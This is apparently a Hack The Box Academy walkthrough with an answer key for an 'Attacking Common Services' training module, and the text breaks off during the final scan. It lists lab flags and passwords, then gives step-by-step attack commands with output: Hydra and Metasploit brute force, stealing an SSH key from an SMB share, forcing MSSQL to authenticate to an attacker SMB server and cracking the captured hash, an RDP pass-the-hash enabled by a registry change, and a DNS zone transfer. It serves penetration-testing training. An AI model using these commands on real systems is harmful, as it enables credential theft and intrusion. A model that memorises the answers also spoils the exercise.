![[cheatsheat-Attacking Common Services]]
# Attacking Common Services Module

## Section Questions Writeup

#### **Tier**: 2

#### **Difficulty**: Medium

#### **Type**: Offensive

#### **Created By**: Cry0l1t3

#### **Co-Authors**: PlainText

## Section Questions and their Answers

|Section|Question Number|Answer|
|---|---|---|
|Attacking FTP|Question 1|2121|
|Attacking FTP|Question 2|robin|
|Attacking FTP|Question 3|HTB{ATT4CK1NG_F7P_53RV1C3}|
|Attacking SMB|Question 1|GGJ|
|Attacking SMB|Question 2|34c8zuNBo91!@28Bszh|
|Attacking SMB|Question 3|HTB{SMB_4TT4CKS_2349872359}|
|Attacking SQL Databases|Question 1|princess1|
|Attacking SQL Databases|Question 2|HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}|
|Attacking RDP|Question 1|pentest-notes.txt|
|Attacking RDP|Question 2|DisableRestrictedAdmin|
|Attacking RDP|Question 3|HTB{RDP_P4$$_Th3_H4$#}|
|Attacking DNS|Question 1|HTB{LUIHNFAS2871SJK1259991}|
|Attacking Email Services|Question 1|marlin|
|Attacking Email Services|Question 2|HTB{w34k_p4$$w0rd}|
|Attacking Common Services - Easy|Question 1|HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}|
|Attacking Common Services - Medium|Question 1|HTB{1qay2wsx3EDC4rfv_M3D1UM}|
|Attacking Common Services - Hard|Question 1|random.txt|
|Attacking Common Services - Hard|Question 2|48Ns72!bns74@S84NNNSl|
|Attacking Common Services - Hard|Question 3|john|
|Attacking Common Services - Hard|Question 4|HTB{46u$!n9_l!nk3d_$3rv3r$}|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Attacking FTP

## Question 1

### "What port is the FTP service running on?"

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
sudo nmap -p- -sV -T5 --open STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.44]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo nmap -p- -sV -T5 --open 10.129.146.230

Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 18:52 BST
Nmap scan report for 10.129.146.230
Host is up (0.24s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2121/tcp open  ftp

<SNIP>
```

Students will find out that `FTP` is running on port `2121`.

Answer: `2121`

# Attacking FTP

## Question 2

### "What username is available for the FTP server?"

Students first need to access the FTP server using anonymous login (i.e., use the credentials `anonymous:anonymous`, or anything for the password) and use `passive mode`:

Code: shell

```shell
ftp STMIP 2121
```

```shell-session
┌─[us-academy-1]─[10.10.14.44]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ftp 10.129.146.230 2121

Connected to 10.129.146.230.
220 ProFTPD Server (InlaneFTP) [10.129.146.230]
Name (10.129.146.230:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive

Passive mode on.
```

When using the `dir` subcommand, students will find two files that they need to download to Pwnbox/`PMVPN`, prior to that, students can turn off interactive mode by issuing the `prompt` subcommand:

Code: shell

```shell
dir
prompt
mget *
```

```shell-session
ftp> dir

227 Entering Passive Mode (10,129,146,230,131,27).
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          1959 Apr 19 21:30 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19 18:54 users.list
226 Transfer complete

ftp> prompt

Interactive mode off.

ftp> mget *

local: passwords.list remote: passwords.list
227 Entering Passive Mode (10,129,146,230,138,143).
150 Opening BINARY mode data connection for passwords.list (1959 bytes)
226 Transfer complete
1959 bytes received in 0.05 secs (36.2114 kB/s)
local: users.list remote: users.list
227 Entering Passive Mode (10,129,146,230,170,123).
150 Opening BINARY mode data connection for users.list (72 bytes)
226 Transfer complete
72 bytes received in 0.01 secs (10.7479 kB/s)
```

Students at last need to use `Hydra` to bruteforce a valid username and password for the SSH service:

Code: shell

```shell
hydra -t 45 -L users.list -P passwords.list ssh://STMIP -q
```

```shell-session
┌─[us-academy-1]─[10.10.14.28]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hydra -t 45 -L users.list -P passwords.list ssh://10.129.136.189 -q

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 45 tasks per 1 server, overall 45 tasks, 2750 login tries (l:11/p:250), ~62 tries per task
[DATA] attacking ssh://10.129.136.189:22/
[22][ssh] host: 10.129.136.189   login: robin   password: 7iz4rnckjsduza7
```

Students will find out that the valid username and password are `robin:7iz4rnckjsduza7`.

Answer: `robin`

# Attacking FTP

## Question 3

### "Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer."

Using the SSH credentials (`robin:7iz4rnckjsduza7`) attained in the previous questions, students need to SSH into the spawned target machine and print the contents of the flag file "flag.txt":

Code: shell

```shell
ssh robin@STMIP
cat flag.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.28]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh robin@10.129.203.6

The authenticity of host '10.129.203.6 (10.129.203.6)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.203.6' (ECDSA) to the list of known hosts.
robin@10.129.203.6's password: 

Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

$ cat flag.txt

HTB{ATT4CK1NG_F7P_53RV1C3}
```

Answer: `HTB{ATT4CK1NG_F7P_53RV1C3}`

# Attacking SMB

## Question 1

### "What is the name of the shared folder with READ and WRITE permissions?"

After spawning the target machine, students need to use `enum4linux` or `enum4linux-ng.py` on it and notice that the share `GGJ` has mapping and listing allowed:

Code: shell

```shell
enum4linux STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.28]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ enum4linux 10.129.203.6

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jun 29 16:29:15 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.129.203.6
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

<SNIP>

 ========================================= 
|    Share Enumeration on 10.129.203.6    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	GGJ             Disk      Priv
	IPC$            IPC       IPC Service (attcsvc-linux Samba)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.129.203.6
//10.129.203.6/print$	Mapping: DENIED, Listing: N/A
//10.129.203.6/GGJ	Mapping: OK, Listing: OK
```

Answer: `GGJ`

# Attacking SMB

## Question 2

### "What is the password for the username "jason"?"

Students need to use `Msfconsole` to bruteforce the password for the username `jason`, using "pws.list" that can be obtained from the [module's resources](https://academy.hackthebox.com/storage/resources/pws.zip); students will find the password of `jason` is `34c8zuNBo91!@28Bszh`:

Code: shell

```shell
msfconsole -q
use auxiliary/scanner/smb/smb_login
set rhosts STMIP
set SMBUSER jason
set PASS_FILE ./pws.list
set stop_on_success true
run
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login 
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.167.224
rhosts => 10.129.167.224
msf6 auxiliary(scanner/smb/smb_login) > set SMBUSER jason
SMBUSER => jason
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE ./pws.list
PASS_FILE => ./pws.list
msf6 auxiliary(scanner/smb/smb_login) > set stop_on_success true
stop_on_success => true
msf6 auxiliary(scanner/smb/smb_login) > run

[*] 10.129.167.224:445    - 10.129.167.224:445 - Starting SMB login bruteforce

<SNIP>

[+] 10.129.167.224:445    - 10.129.167.224:445 - Success: '.\jason:34c8zuNBo91!@28Bszh'
[*] 10.129.167.224:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Answer: `34c8zuNBo91!@28Bszh`

# Attacking SMB

## Question 3

### "Login as the user "jason" via SSH and find the flag.txt. Submit the contents as the answer."

Using the credentials `jason:34c8zuNBo91!@28Bszh`, students first need to use `smbclient` to access the `GGJ` share on which they will find the SSH private key of `jason`:

Code: shell

```shell
smbclient -U jason //STMIP/GGJ
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ smbclient -U jason //10.129.137.91/GGJ

Enter WORKGROUP\jason's password:

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Apr 19 22:33:55 2022
  ..                                  D        0  Mon Apr 18 18:08:30 2022
  id_rsa                              N     3381  Tue Apr 19 22:33:04 2022

	14384136 blocks of size 1024. 9664764 blocks available
```

Subsequently, students need to download the SSH private key and then exit from the session/connection:

Code: shell

```shell
get id_rsa
exit
```

```shell-session
smb: \> get id_rsa

getting file \id_rsa of size 3381 as id_rsa (10.6 KiloBytes/sec) (average 10.6 KiloBytes/sec)
smb: \> exit
```

Students then need to set the appropriate permissions on the private key and use it to access the spawned target machine:

Code: shell

```shell
chmod 600
ssh -i id_rsa jason@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ chmod 600 id_rsa
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -i id_rsa jason@10.129.137.91

The authenticity of host '10.129.137.91 (10.129.137.91)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.137.91' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

<SNIP>
```

At last, students need to print the contents of the flag file "flag.txt", attaining `HTB{SMB_4TT4CKS_2349872359}`:

Code: shell

```shell
cat flag.txt
```

```shell-session
$ cat flag.txt

HTB{SMB_4TT4CKS_2349872359}
```

Answer: `HTB{SMB_4TT4CKS_2349872359}`

# Attacking SQL Databases

## Question 1

### "What is the password for the "mssqlsvc" user?"

Students first need to install `sqlcmd` on `Pwnbox`/`PMVPN` (if not already installed):

Code: shell

```shell
sudo apt install sqlcmd
```

```shell-session
┌─[us-academy-1]─[10.10.14.138]─[htb-ac413848@htb-kytxdmh4gu]─[~]
└──╼ [★]$ sudo apt install sqlcmd

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libgit2-1.1 libmbedcrypto3 libmbedtls12 libmbedx509-0 libstd-rust-1.48 libstd-rust-dev linux-kbuild-5.18 rust-gdb
Use 'sudo apt autoremove' to remove them.
The following NEW packages will be installed:
  sqlcmd
0 upgraded, 1 newly installed, 0 to remove and 1 not upgraded.
Need to get 5,190 kB of archives.
After this operation, 12.2 MB of additional disk space will be used.
Get:1 https://packages.microsoft.com/debian/10/prod buster/main amd64 sqlcmd all 0.8.0-1~buster [5,190 kB]
Fetched 5,190 kB in 0s (20.5 MB/s)
Selecting previously unselected package sqlcmd.
(Reading database ... 472823 files and directories currently installed.)
Preparing to unpack .../sqlcmd_0.8.0-1~buster_all.deb ...
Unpacking sqlcmd (0.8.0-1~buster) ...
Setting up sqlcmd (0.8.0-1~buster) ...
Scanning application launchers
Removing duplicate launchers or broken launchers
Launchers are updated
```

Subsequently, students need to use `sqlcmd` to connect to the SQL server on the spawned target machine with the credentials `htbduser:MSSQLAccess01!`:

Code: shell

```shell
sqlcmd -S STMIP -U htbdbuser
```

```shell-session
┌─[us-academy-1]─[10.10.14.138]─[htb-ac413848@htb-kytxdmh4gu]─[~]
└──╼ [★]$ sqlcmd -S 10.129.247.219 -U htbdbuser

Password:
1>
```

In another terminal tab on Pwnbox/`PMVPN`, students need to start an SMB share with `impacket-smbserver` and utilize the flag `-smb2support`:

Code: shell

```shell
sudo impacket-smbserver share ./ -smb2support
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo impacket-smbserver share ./ -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Afterward, using the terminal tab with the `sqlcmd` connection, students need to steal the `MSSQL` service account hash using either `xp_subdirs` or `xp_dirtree`, the latter will be used:

Code: sql

```sql
EXEC master..xp_dirtree '\\PWNIP\share'
go
```

Code: sql

```sql
1> EXEC master..xp_dirtree '\\10.10.14.138\share'
2> go

(0 rows affected)
```

Students will receive the NetNTLMv2 hash of `mssqlsvc` on the terminal tab with `impacket-smbserver` running:

```shell-session
[*] Incoming connection (10.129.203.12,49676)
[*] AUTHENTICATE_MESSAGE (WIN-02\mssqlsvc,WIN-02)
[*] User WIN-02\mssqlsvc authenticated successfully
[*]mssqlsvc::WIN02:aaaaaaaaaaaaaaaa:da87f7aa577b48e8361cf1b021e6bfca:010100000000000000555ef6718cd801e1b423320a45d0570000000001001000760055004a005100610058005200550003001000760055004a00510061005800520055000200100069004700430077004f0055006b0077000400100069004700430077004f0055006b0077000700080000555ef6718cd80106000400020000000800300030000000000000000000000000300000f4316f662256a822989f5d2574efb5b4cbf92c2ce43cb82538c6b2b358a130650a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000
[*] Closing down connection (10.129.203.12,49676)
[*] Remaining connections []
```

Therefore, students need to save the NetNTLMv2 hash into a file:

Code: shell

```shell
echo "mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:da87f7aa577b48e8361cf1b021e6bfca:010100000000000000555ef6718cd801e1b423320a45d0570000000001001000760055004a005100610058005200550003001000760055004a00510061005800520055000200100069004700430077004f0055006b0077000400100069004700430077004f0055006b0077000700080000555ef6718cd80106000400020000000800300030000000000000000000000000300000f4316f662256a822989f5d2574efb5b4cbf92c2ce43cb82538c6b2b358a130650a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000" > hash.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo "mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:da87f7aa577b48e8361cf1b021e6bfca:010100000000000000555ef6718cd801e1b423320a45d0570000000001001000760055004a005100610058005200550003001000760055004a00510061005800520055000200100069004700430077004f0055006b0077000400100069004700430077004f0055006b0077000700080000555ef6718cd80106000400020000000800300030000000000000000000000000300000f4316f662256a822989f5d2574efb5b4cbf92c2ce43cb82538c6b2b358a130650a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000" > hash.txt
```

And at last, students need to crack the hash using `Hashcat` utilizing hashmode 5600, to find that the plaintext password of the `MSSQLSVC` user is `princess1`:

Code: shell

```shell
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hashcat -m 5600 -O hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

<SNIP>

MSSQLSVC::WIN-02:aaaaaaaaaaaaaaaa:da87f7aa577b48e8361cf1b021e6bfca:010100000000000000555ef6718cd801e1b423320a45d0570000000001001000760055004a005100610058005200550003001000760055004a00510061005800520055000200100069004700430077004f0055006b0077000400100069004700430077004f0055006b0077000700080000555ef6718cd80106000400020000000800300030000000000000000000000000300000f4316f662256a822989f5d2574efb5b4cbf92c2ce43cb82538c6b2b358a130650a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000:princess1
```

Answer: `princess1`

# Attacking SQL Databases

## Question 2

### "Enumerate the "flagDB" database and submit a flag as your answer."

Students need to use `sqlcmd` to connect to the SQL server on the spawned target machine with the previously harvested credentials `mssqlsvc:princess1`:

Code: shell

```shell
sqlcmd -S STMIP -U .\\mssqlsvc
```

```shell-session
┌─[us-academy-1]─[10.10.14.138]─[htb-ac413848@htb-kytxdmh4gu]─[~]
└──╼ [★]$ sqlcmd -S 10.129.247.219 -U .\\mssqlsvc

Password:
1>
```

Subsequently, students need to use the `flagDB` database and query for the names of tables within it, finding the table `tb_flag`:

Code: sql

```sql
use flagDB
go
SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
go
```

Code: sql

```sql
1> use flagDB
2> go
Changed database context to 'flagDB'.
1> SELECT table_name FROM flagDB.INFORMATION_SCHEMA.tables
2> go
table_name                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
tb_flag                                                                                                                         

(1 row affected)
```

Students need to use the `SELECT *` statement on the table `tb_flag` to attain the flag `HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}`:

Code: sql

```sql
SELECT * FROM tb_flag
go
```

Code: sql

```sql
1> SELECT * FROM tb_flag 
2> go
flagvalue
----------------------------------------------------------------------------------------------------
HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}                                                                   

(1 row affected)
```

Answer: `HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}`

# Attacking RDP

## Question 1

### "What is the name of the file that was left on the desktop? (Format example: filename.txt)"

Students first need to connect to the spawned target machine using `xfreerdp` with the credentials `htb-rdp:HTBRocks!`:

Code: shell

```shell
xfreerdp /u:htb-rdp /p:HTBRocks! /v:STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /u:htb-rdp /p:HTBRocks! /v:10.129.203.13

<SNIP>

Certificate details for 10.129.203.13:3389 (RDP-Server):
	Common Name: WIN-01
	Subject:     CN = WIN-01
	Issuer:      CN = WIN-01
	Thumbprint:  22:13:cf:12:55:23:ab:9c:41:79:6a:b0:27:b3:09:32:8e:c3:5b:08:cc:09:17:2c:46:bd:9b:f5:56:ae:57:7d
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Once the RDP connection is established, students will find out a file named `pentest-notes.txt` on the Desktop directory:

![Attacking_Common_Services_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/40/Attacking_Common_Services_Walkthrough_Image_1.png)

Answer: `pentest-notes.txt`

# Attacking RDP

## Question 2

### "Which registry key needs to be changed to allow Pass the Hash with RDP protocol?"

The `DisableRestrictedAdmin` registry key needs to be changed to allow Pass the Hash with the RDP protocol:

![Attacking_Common_Services_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/40/Attacking_Common_Services_Walkthrough_Image_2.png)

Answer: `DisableRestrictedAdmin`

# Attacking RDP

## Question 3

### "Connect to the RDP with the Administrator account and submit the flag.txt as answer."

Using the same RDP session established in the first question of this section, students first need to add the the `DisableRestrictedAdmin` registry key:

Code: shell

```shell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```shell-session
C:\Users\htb-rdp>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

The operation completed successfully.
```

Students then need to open the "pentest-notes.txt" on the Desktop directory file to find the hash of the Administrator user:

![Attacking_Common_Services_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/40/Attacking_Common_Services_Walkthrough_Image_3.png)

Subsequently, students need to copy it and use it with `xfreerdp`:

Code: shell

```shell
xfreerdp /v:STMIP /pth:0E14B9D6330BF16C30B1924111104824 /u:administrator
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.203.13 /pth:0E14B9D6330BF16C30B1924111104824 /u:administrator

[20:49:56:985] [8281:8282] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[20:49:56:985] [8281:8282] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[20:49:56:985] [8281:8282] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[20:49:56:985] [8281:8282] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Once the RDP connection is established, students will find the "flag.txt" file on the Desktop directory.

Answer: `HTB{RDP_P4$$_Th3_H4$#}`

# Attacking DNS

## Question 1

### "Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer."

Students first need clone the `subbrute` repository and change directories into it:

Code: shell

```shell
git clone https://github.com/TheRook/subbrute.git && cd subbrute/
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ git clone https://github.com/TheRook/subbrute.git && cd subbrute/

Cloning into 'subbrute'...
remote: Enumerating objects: 438, done.
remote: Total 438 (delta 0), reused 0 (delta 0), pack-reused 438
Receiving objects: 100% (438/438), 11.85 MiB | 20.67 MiB/s, done.
Resolving deltas: 100% (216/216), done.
```

Students then need to add `STMIP` into the "resolvers.txt" file:

Code: shell

```shell
echo STMIP > resolvers.txt
```

Subsequently students need to use `subbrute`:

Code: shell

```shell
python3 subbrute.py inlanefreight.htb -s /opt/useful/SecLists/Discovery/DNS/namelist.txt -r resolvers.txt
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~/subbrute]
└──╼ [★]$ python3 subbrute.py inlanefreight.htb -s /opt/useful/SecLists/Discovery/DNS/namelist.txt -r resolvers.txt

Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
inlanefreight.htb
helpdesk.inlanefreight.htb
hr.inlanefreight.htb
ns.inlanefreight.htb
```

Students then need to perform a zone transfer and `grep` for the TXT record to find the flag:

Code: shell

```shell
dig axfr hr.inlanefreight.htb @STMIP | grep "TXT"
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~/subbrute]
└──╼ [★]$ dig axfr hr.inlanefreight.htb @10.129.137.154 | grep "TXT"

hr.inlanefreight.htb.	604800	IN	TXT	"HTB{LUIHNFAS2871SJK1259991}"
```

Answer: `HTB{LUIHNFAS2871SJK1259991}`

# Attacking Email Services

## Question 1

### "What is the available username for domain inlanefreight.htb in the SMTP server?"

Using "users.list" that can be obtained from the [module's resources](https://academy.hackthebox.com/storage/resources/users.zip), students need to use `smtp-user-enum`:

Code: shell

```shell
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

## Scan started at Thu Jun 30 22:02:35 2022 ###
10.129.203.12: marlin@inlanefreight.htb exists
## Scan completed at Thu Jun 30 22:02:42 2022 ###
1 results.

79 queries in 7 seconds (11.3 queries / sec)
```

Students will find out that the username is `marlin`.

Answer: `marlin`

# Attacking Email Services

## Question 2

### "Access the email account using the user credentials that you discovered and submit the flag in the email as your answer."

Since students know that the username is `marlin`, they need to bruteforce the password using `Hydra`:

Code: shell

```shell
hydra -l marlin@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://STMIP -f
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hydra -l marlin@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.203.12 -f

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak 

<SNIP>

[DATA] attacking smtp://10.129.203.12:25/
[25][smtp] host: 10.129.203.12   login: marlin@inlanefreight.htb   password: poohbear
[STATUS] attack finished for 10.129.203.12 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-30 22:11:17
```

Students then need to configure the user account `merlin@inlanefreight.htb` with the password `poohbear` using IMAP or POP3 to read the flag `HTB{w34k_p4$$w0rd}` in the inbox; the former protocol will be used:

Code: shell

```shell
telnet STMIP 143
11 login "marlin@inlanefreight.htb" "poohbear"
12 select "INBOX"
13 FETCH 1 BODY[]
```

```shell-session
┌─[us-academy-1]─[10.10.14.4]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ telnet 10.129.203.12 143

Trying 10.129.203.12...
Connected to 10.129.203.12.
Escape character is '^]'.
* OK IMAPrev1
11 login "marlin@inlanefreight.htb" "poohbear"
11 OK LOGIN completed
12 select "INBOX"
* 1 EXISTS
* 1 RECENT
* FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
* OK [UIDVALIDITY 1650465305] current uidvalidity
* OK [UIDNEXT 2] next uid
* OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
12 OK [READ-WRITE] SELECT completed
13 FETCH 1 BODY[]
* 1 FETCH (BODY[] {640}
Return-Path: marlin@inlanefreight.htb
Received: from [10.10.14.33] (Unknown [10.10.14.33])
	by WINSRV02 with ESMTPA
	; Wed, 20 Apr 2022 14:49:32 -0500
Message-ID: <85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>
Subject: Password change
From: marlin <marlin@inlanefreight.htb>
To: administrator@inlanefreight.htb
Cc: marlin@inlanefreight.htb
Date: Wed, 20 Apr 2022 15:49:11 -0400
Content-Type: text/plain; charset="UTF-8"
User-Agent: Evolution 3.38.3-1 
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

Hi admin,

How can I change my password to something more secure? 

flag: HTB{w34k_p4$$w0rd}


)
13 OK FETCH completed
```

Answer: `HTB{w34k_p4$$w0rd}`

# Attacking Common Services - Easy

## Question 1

### "You are targeting the inlanefreight\.htb domain. Assess the target server and obtain the contents of the flag\.txt file\. Submit it as the answer."

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
nmap -A STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ nmap -A 10.129.203.7

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 13:54 GMT
Nmap scan report for 10.129.203.7
Host is up (0.014s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   NULL: 
|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|_ssl-date: 2022-11-27T13:56:03+00:00; 0s from scanner time.
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: Welcome to XAMPP
|_Requested resource was http://10.129.203.7/dashboard/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
443/tcp  open  https         Core FTP HTTPS Server
| fingerprint-strings: 
|   LDAPSearchReq: 
|_    550 Too many connections, please try later...
|_ssl-date: 2022-11-27T13:56:03+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
|_http-server-header: Core FTP HTTPS Server
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
